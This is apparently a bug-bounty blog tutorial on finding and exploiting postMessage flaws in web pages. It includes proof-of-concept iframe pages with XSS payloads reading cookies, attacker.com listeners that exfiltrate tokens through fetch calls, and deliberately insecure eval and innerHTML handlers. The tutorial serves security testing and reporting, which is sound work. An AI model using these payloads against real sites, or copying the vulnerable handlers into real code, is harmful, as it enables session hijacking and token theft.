---
title: "Exploiting postMessage: When iframes Talk Too Freely"
date: 2025-11-25T10:00:00-05:00
draft: false
tags: ["postmessage", "xss", "web-security", "client-side", "bug-bounty"]
difficulty: ""
---

The `window.postMessage` API lets windows and iframes communicate across origins. It was designed as a safe alternative to the hacks developers used before it existed (like changing `window.name` or using fragment identifiers for cross-origin communication). The problem is that most implementations don't validate where messages come from or what they contain. This post covers how to find and exploit postMessage vulnerabilities.

<!--more-->

## How postMessage Works

A page sends a message to another window:

```javascript
// Sender: https://parent.com
var iframe = document.getElementById('child');
iframe.contentWindow.postMessage('hello', 'https://child.com');
```

The receiving page listens for it:

```javascript
// Receiver: https://child.com
window.addEventListener('message', function(event) {
    // event.origin = "https://parent.com"
    // event.data = "hello"
    // event.source = reference to the sender window
    console.log(event.data);
});
```

The second argument in `postMessage()` is the target origin. It restricts which origin can receive the message. The receiver gets `event.origin` which tells it who sent the message. Both of these are security mechanisms. Both are routinely ignored.

## The Two Main Vulnerabilities

**1. Missing origin check on the receiver**: the listener processes messages from any origin without checking `event.origin`. An attacker hosts a page that iframes the vulnerable page and sends it a crafted message.

**2. Using wildcard target origin on the sender**: the sender uses `postMessage(data, '*')` instead of specifying the expected origin. This means any page that can get a reference to the sender's window receives the message, including sensitive data.

## Finding postMessage Listeners

Open DevTools, go to the Console, and run:

```javascript
// List all message event listeners on the window
getEventListeners(window).message
```

This shows you every registered message listener, including the source file and line number. Click through to read the handler code.

For large-scale hunting, search the JavaScript files:

```bash
grep -rn 'addEventListener.*message' js_files/
grep -rn 'onmessage' js_files/
grep -rn 'postMessage' js_files/
```

In Burp, you can use the "DOM Invocation" feature in the browser or search the sitemap for these patterns.

A faster approach for live testing: use the browser console to override the listener temporarily and log what messages the page is already receiving:

```javascript
window.addEventListener('message', function(e) {
    console.log('Origin:', e.origin);
    console.log('Data:', e.data);
    console.log('Source:', e.source);
});
```

Load the page normally and watch the console. Many applications have iframes and widgets that are already sending postMessages back and forth. This shows you the expected message format, which you'll need for crafting your exploit.

## Vulnerability 1: No Origin Check

The most common case. The listener does something with `event.data` without checking `event.origin`:

```javascript
window.addEventListener('message', function(event) {
    // No origin check at all
    document.getElementById('output').innerHTML = event.data;
});
```

Any page on the internet can send a message to this window and get HTML injection, which leads to XSS.

Exploit:

```html
<!-- attacker.com/exploit.html -->
<iframe id="target" src="https://vulnerable.com/page"></iframe>
<script>
    var iframe = document.getElementById('target');
    iframe.onload = function() {
        iframe.contentWindow.postMessage(
            '<img src=x onerror=alert(document.cookie)>',
            '*'
        );
    };
</script>
```

The victim visits `attacker.com/exploit.html`, which iframes the vulnerable page and sends it a malicious message. The listener processes it, injects the HTML, and the attacker's JavaScript executes in the context of `vulnerable.com`.

## Vulnerability 2: Weak Origin Check

Developers sometimes add an origin check, but do it wrong:

**indexOf check**:

```javascript
window.addEventListener('message', function(event) {
    if (event.origin.indexOf('trusted.com') !== -1) {
        eval(event.data);
    }
});
```

This passes for `https://trusted.com` but also passes for `https://trusted.com.attacker.com` or `https://attacker.com?trusted.com`. The `indexOf` function just checks if the string appears anywhere.

**endsWith check**:

```javascript
if (event.origin.endsWith('trusted.com')) {
    // process message
}
```

This passes for `https://nottrusted.com` because the string ends with `trusted.com`. You need to check for `.trusted.com` or do an exact match.

**Regex without anchors**:

```javascript
if (/trusted\.com/.test(event.origin)) {
    // process message
}
```

Same issue as indexOf. The regex matches anywhere in the string. An origin like `https://trusted.com.attacker.com` passes.

**Correct check** (for reference):

```javascript
if (event.origin === 'https://trusted.com') {
    // exact match - safe
}

// Or for subdomains:
if (event.origin === 'https://trusted.com' || 
    event.origin.endsWith('.trusted.com')) {
    // this is better but still trusts all subdomains
    // if any subdomain is compromised (XSS, takeover), this breaks
}
```

## Vulnerability 3: Sensitive Data via Wildcard Origin

The sender uses `*` as the target origin:

```javascript
// On vulnerable.com
var popup = window.open('https://partner.com/callback');
popup.postMessage(JSON.stringify({token: userToken, email: userEmail}), '*');
```

Any page, not just `partner.com`, can receive this message if it can get a window reference. The attacker opens `vulnerable.com` in a popup or iframe and listens:

```html
<!-- attacker.com -->
<script>
window.addEventListener('message', function(event) {
    // Steal the token and email
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(event.data)));
});

window.open('https://vulnerable.com/page-that-sends-messages');
</script>
```

This is data exfiltration. The severity depends on what's in the message. Tokens, PII, session data, and internal API responses are all things I've seen sent via `postMessage` with `*`.

## Vulnerability 4: DOM XSS Through Message Data

Even with a proper origin check, if the message data is used unsafely, a compromised or malicious trusted origin can exploit it. But more commonly, the data flows into dangerous sinks without any check:

```javascript
window.addEventListener('message', function(event) {
    // Data flows into dangerous sinks
    
    // innerHTML (XSS)
    document.getElementById('content').innerHTML = event.data.html;
    
    // eval (code execution)
    eval(event.data.code);
    
    // location (open redirect)
    window.location = event.data.url;
    
    // document.write (XSS)
    document.write(event.data.template);
    
    // jQuery html() (XSS)
    $('#content').html(event.data.content);
    
    // Dynamic script creation
    var s = document.createElement('script');
    s.src = event.data.scriptUrl;
    document.body.appendChild(s);
});
```

Each of these is exploitable. The sink determines the impact:

- `innerHTML`, `document.write`, `.html()` lead to XSS
- `eval()`, dynamic script creation lead to arbitrary code execution
- `window.location`, `window.open` lead to open redirect or token theft (if the URL includes fragments/query params from the current page)

## Vulnerability 5: Chaining postMessage with OAuth/Auth Flows

Many OAuth implementations use postMessage to communicate the authorization result from a popup back to the parent window. The popup completes the OAuth flow, gets the token, and sends it to the opener via postMessage.

```javascript
// In the OAuth callback popup
window.opener.postMessage({
    type: 'oauth_complete',
    token: accessToken
}, '*');  // Wildcard origin - anyone can receive this
window.close();
```

If the target origin is `*`, any page that opened this popup gets the token. The attacker hosts a page that initiates the OAuth flow:

```html
<script>
window.addEventListener('message', function(event) {
    if (event.data && event.data.token) {
        fetch('https://attacker.com/steal?token=' + event.data.token);
    }
});

// Open the OAuth flow
window.open('https://vulnerable.com/auth/google/callback');
</script>
```

Even if the target origin is set correctly, if the parent page has an XSS or open redirect, you can still intercept the message.

## Real-World Message Formats

In practice, postMessage data isn't always a simple string. Applications send structured data:

```javascript
// JSON objects
postMessage(JSON.stringify({action: 'resize', height: 500}), '*');

// Plain objects (no need to stringify in modern browsers)
postMessage({type: 'update', content: '<p>New content</p>'}, '*');

// Sometimes with a specific action/type field
postMessage({cmd: 'navigate', url: '/dashboard'}, '*');
```

When testing, you need to match the expected format. If the listener expects `{type: 'update', content: '...'}` and you send a plain string, it won't hit the vulnerable code path. Read the listener code or observe legitimate messages to understand the format.

```javascript
// In the listener, there's often a switch on the message type
window.addEventListener('message', function(event) {
    var data = JSON.parse(event.data);
    switch(data.action) {
        case 'setContent':
            document.getElementById('frame-content').innerHTML = data.html;
            break;
        case 'redirect':
            window.location.href = data.url;
            break;
        case 'resize':
            document.getElementById('widget').style.height = data.height + 'px';
            break;
    }
});
```

The `setContent` case has XSS via innerHTML. The `redirect` case has open redirect. The `resize` case is probably safe (unless you can inject into the style value, but `+ 'px'` limits that).

Your exploit needs to target the specific vulnerable case:

```html
<iframe id="target" src="https://vulnerable.com/widget"></iframe>
<script>
document.getElementById('target').onload = function() {
    this.contentWindow.postMessage(
        JSON.stringify({
            action: 'setContent',
            html: '<img src=x onerror=alert(document.domain)>'
        }),
        '*'
    );
};
</script>
```

## Testing Methodology

**Step 1**: find all postMessage listeners in the application's JavaScript. Search for `addEventListener('message'` and `onmessage`.

**Step 2**: read each listener. Check:
- Is `event.origin` validated? How? (exact match, indexOf, regex, endsWith)
- What sinks does `event.data` flow into? (innerHTML, eval, location, etc.)
- What format does the listener expect? (string, JSON, specific fields)

**Step 3**: find all `postMessage()` calls. Check:
- What's the target origin? If it's `*`, any receiver can get the data.
- What data is being sent? Tokens, user info, sensitive content?

**Step 4**: build a proof of concept. Host an HTML page on your domain that:
- Iframes or opens the vulnerable page
- Waits for it to load
- Sends a crafted message (for listener vulns) or listens for messages (for sender vulns)

**Step 5**: test edge cases:
- What if you send the message before the page finishes loading? Some listeners are registered late.
- What if you send multiple messages? Some handlers have state that can be manipulated.
- What if the data is partially valid? Send the right `type` field but inject in a different field.
- Can you race the legitimate sender? If the page expects a message from a trusted iframe, send yours first.

## Tools

**PMHook** is a browser extension that hooks all postMessage calls and listeners, logging them in the console. Makes it easy to see all message traffic without reading the source.

**Burp Suite DOM Invocations** tracks postMessage usage as part of its DOM audit.

For manual testing, this bookmarklet logs all messages:

```javascript
javascript:void(window.addEventListener('message',function(e){console.log('%cpostMessage','color:red;font-weight:bold','Origin:',e.origin,'Data:',e.data)}))
```

## Reporting

When reporting a postMessage vulnerability:

1. Identify the vulnerable listener or sender with the exact file and line number
2. Show the missing or broken origin check
3. Identify the dangerous sink
4. Provide a standalone HTML proof of concept hosted on a different origin
5. Show the impact: XSS execution, data exfiltration, account takeover chain

The PoC needs to work from a different origin than the target. Host it on a simple HTTP server or use a service like GitHub Pages. The whole point is demonstrating cross-origin exploitation.

For XSS via postMessage, the impact is the same as regular XSS: cookie theft, session hijacking, account takeover. But the attack vector is different. The victim needs to visit the attacker's page, not click a crafted link on the vulnerable domain. This is more like stored XSS in terms of reliability since the attacker controls the full page the victim visits.